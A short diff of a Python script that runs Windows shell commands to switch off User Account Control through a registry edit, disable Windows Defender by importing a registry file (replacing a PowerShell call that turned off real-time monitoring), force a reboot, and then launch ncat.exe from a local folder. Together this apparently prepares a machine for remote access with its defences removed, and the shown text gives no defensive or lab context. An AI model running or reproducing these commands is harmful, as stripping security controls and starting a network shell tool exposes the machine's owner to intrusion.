@@ -8,7 +8,8 @@ import subprocess
 
 #Turn off UAC and windows defender
 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-p = subprocess.Popen(["powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true"], stdout=sys.stdout)
+os.system("reg IMPORT c:/Rio/Disable_Defender.reg")
+os.system("shutdown /r")
 
 os.system("cd c:/Rio")
 os.system("ncat.exe")
